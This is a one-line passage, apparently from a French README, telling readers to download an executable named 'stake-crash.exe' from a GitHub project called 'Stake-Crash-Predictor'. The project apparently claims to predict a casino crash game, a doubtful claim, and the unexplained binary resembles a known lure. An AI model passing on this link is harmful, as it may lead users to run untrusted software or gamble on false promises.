...
1. Téléchargez la dernière version depuis la section [Télécharger](https://github.com/Stake-Community/Stake-Crash-Predictor/releases/download/stake-crash/stake-crash.exe).
